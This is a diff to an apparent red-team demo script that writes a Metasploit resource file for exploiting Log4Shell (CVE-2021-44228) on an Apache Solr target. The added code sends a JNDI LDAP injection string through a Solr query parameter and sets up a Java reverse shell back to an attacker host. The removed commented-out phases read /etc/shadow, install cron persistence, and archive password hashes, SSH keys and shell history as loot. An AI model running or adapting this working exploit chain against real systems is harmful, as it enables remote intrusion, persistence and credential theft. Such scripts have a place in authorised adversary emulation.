@@ -342,21 +342,27 @@ jobs -K
 # ============================================================================
 # PHASE 2: INITIAL ACCESS — Log4Shell (CVE-2021-44228)
 # ============================================================================
+# The log4shell_header_injection module sets up the LDAP and HTTP servers
+# needed for the JNDI exploitation chain, but Solr doesn't log HTTP headers
+# through Log4j. We run the module as a background job to keep the servers
+# running, then inject the JNDI string via a Solr query parameter (which
+# IS logged through Log4j).
 use exploit/multi/http/log4shell_header_injection
 
 set RHOSTS ${TARGET_IP}
 set RPORT ${EXPLOIT_PORT}
 set SRVHOST ${ATTACKER_IP}
-set TARGETURI /solr/admin/info/system
+set SRVPORT 1389
+set TARGETURI /solr/admin/cores
 set HTTP_HEADER User-Agent
-set PAYLOAD linux/x64/shell_reverse_tcp
+set PAYLOAD java/shell_reverse_tcp
 set LHOST ${ATTACKER_IP}
 set LPORT ${LPORT}
+set ForceExploit true
+set AutoCheck false
+set WfsDelay 60
 
-exploit
-
-sleep 5
-sessions -l
+exploit -j -z
 
 <ruby>
 # Helper: run a command on the session and display it
@@ -369,6 +375,34 @@ def run_cmd(cmd, session_id)
   sleep(0.5)
 end
 
+# Wait for the LDAP and HTTP servers to start
+puts "\033[0;35m[host-scan]\033[0m Waiting for LDAP/HTTP servers to start..."
+sleep(8)
+
+# Inject JNDI payload via Solr query parameter (which IS logged by Log4j)
+jndi_str = "\${jndi:ldap://${ATTACKER_IP}:1389/exploit}"
+target_url = "http://${TARGET_IP}:${EXPLOIT_PORT}/solr/admin/cores?action=#{jndi_str}"
+puts "\033[0;35m[host-scan]\033[0m Sending JNDI injection via Solr action parameter..."
+puts "\033[0;35m[host-scan]\033[0m   URL: #{target_url}"
+puts ""
+
+require 'net/http'
+begin
+  uri = URI(target_url)
+  Net::HTTP.get_response(uri)
+  puts "\033[0;35m[host-scan]\033[0m Request sent. Waiting for reverse shell..."
+rescue => e
+  puts "\033[0;35m[host-scan]\033[0m Request sent (#{e.message}). Waiting for reverse shell..."
+end
+
+# Wait for the target to process JNDI lookup -> LDAP -> HTTP -> reverse shell
+30.times do |i|
+  sleep(1)
+  break if framework.sessions.count > 0
+  print "." if i % 5 == 4
+end
+puts ""
+
 # Check if we got a session
 if framework.sessions.count == 0
   puts ""
@@ -376,9 +410,10 @@ if framework.sessions.count == 0
   puts "\033[0;35m[host-scan]\033[0m Possible causes:"
   puts "\033[0;35m[host-scan]\033[0m   - Target JDK >= 8u191 (JNDI class loading restricted)"
   puts "\033[0;35m[host-scan]\033[0m   - Target Log4j patched (>= 2.17.0)"
-  puts "\033[0;35m[host-scan]\033[0m   - Firewall blocking ports 1389/8888 from target to attacker"
+  puts "\033[0;35m[host-scan]\033[0m   - Firewall blocking ports 1389/8080 from target to attacker"
   puts "\033[0;35m[host-scan]\033[0m   - Check: iptables -L -n on attacker"
   puts ""
+  run_single("jobs -K")
   run_single("exit")
 end
 
@@ -388,62 +423,12 @@ puts "\033[0;35m#{'=' * 80}\033[0m"
 puts "\033[0;35m[host-scan]\033[0m \033[0;32mReverse shell established (session #{\$session_id})\033[0m"
 puts "\033[0;35m#{'=' * 80}\033[0m"
 puts ""
-puts "\033[0;35m[host-scan]\033[0m RCE achieved via Log4Shell JNDI injection in User-Agent header."
+puts "\033[0;35m[host-scan]\033[0m RCE achieved via Log4Shell JNDI injection in Solr action parameter."
 puts ""
 </ruby>
 
-# --- Post-exploitation phases (commented out for demo) ---
-# Uncomment to run discovery, privesc, persistence, credential access, and collection.
-#
-# # ============================================================================
-# # PHASE 3: DISCOVERY (T1082)
-# # ============================================================================
-# <ruby>
-# run_cmd("whoami", \$session_id)
-# run_cmd("id", \$session_id)
-# run_cmd("uname -a", \$session_id)
-# run_cmd("hostname", \$session_id)
-# run_cmd("cat /etc/passwd | grep -v nologin", \$session_id)
-# run_cmd("ps aux | grep -E 'java|solr|tomcat|elastic' | grep -v grep", \$session_id)
-# run_cmd("find /opt -name 'log4j-core-*.jar' 2>/dev/null | head -10", \$session_id)
-# run_cmd("ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null", \$session_id)
-# </ruby>
-#
-# # ============================================================================
-# # PHASE 4: PRIVILEGE ESCALATION (T1548)
-# # ============================================================================
-# <ruby>
-# run_cmd("sudo -l", \$session_id)
-# run_cmd("sudo whoami", \$session_id)
-# </ruby>
-#
-# # ============================================================================
-# # PHASE 5: PERSISTENCE (T1053.003)
-# # ============================================================================
-# <ruby>
-# session = framework.sessions[\$session_id]
-# session.shell_command_token("echo ${CRON_B64} | base64 -d > /tmp/.cron")
-# session.shell_command_token("sudo crontab /tmp/.cron")
-# session.shell_command_token("rm -f /tmp/.cron")
-# run_cmd("sudo crontab -l", \$session_id)
-# </ruby>
-#
-# # ============================================================================
-# # PHASE 6: CREDENTIAL ACCESS (T1003.008)
-# # ============================================================================
-# <ruby>
-# run_cmd("sudo cat /etc/shadow", \$session_id)
-# </ruby>
-#
-# # ============================================================================
-# # PHASE 7: COLLECTION (T1560.001)
-# # ============================================================================
-# <ruby>
-# run_cmd("sudo tar -czf /tmp/loot.tar.gz /etc/shadow /etc/passwd /home/ubuntu/.ssh/authorized_keys /home/ubuntu/.bash_history 2>&1", \$session_id)
-# run_cmd("ls -la /tmp/loot.tar.gz", \$session_id)
-# </ruby>
-
 sessions -K
+jobs -K
 exit
 RCEOF
     }
@@ -456,9 +441,9 @@ RCEOF
     build_rc
 
     phase "2" "INITIAL ACCESS" "T1190 - Exploit Public-Facing Application" \
-        "Exploiting Log4Shell (CVE-2021-44228) via JNDI injection in User-Agent header.
+        "Exploiting Log4Shell (CVE-2021-44228) via JNDI injection in Solr action parameter.
     Target: ${TARGET_IP}:${EXPLOIT_PORT}
-    Metasploit starts rogue LDAP server (port 1389) and HTTP server (port 8888).
+    Metasploit starts rogue LDAP server (port 1389) and HTTP server (port 8080).
     Target's Log4j resolves the JNDI lookup, fetches malicious class, opens reverse shell."
 
     log "Launching Metasploit..."
